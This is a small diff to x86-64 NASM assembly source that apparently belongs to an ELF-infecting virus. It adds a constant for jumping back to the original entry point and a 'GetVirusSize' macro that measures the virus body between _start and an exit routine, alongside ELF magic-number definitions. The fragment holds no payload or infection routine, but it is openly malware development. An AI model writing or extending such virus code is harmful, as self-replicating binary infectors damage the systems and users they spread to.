@@ -28,6 +28,7 @@
 ; MAGIC-NUMBERS >-----------------------------------------------------------<
 
 %define SZ_DENT         0x0200
+%define SZ_JMP_OEP      0x000C
 
 %define ELF_MAGIC       0x464c457f
 %define ELF_LENDIAN     0x0001
@@ -41,6 +42,12 @@
 %define STDOUT          0x0001
 
 ; WRAPPERS >----------------------------------------------------------------<
+
+%macro GetVirusSize 0
+  mov   rcx,  VExitRoutine
+  mov   rbx,  _start
+  sub   rcx,  rbx           ; rcx = size V-Body
+%endmacro
 
 %macro Write 3
   mov   rdi,  %1          ; fd
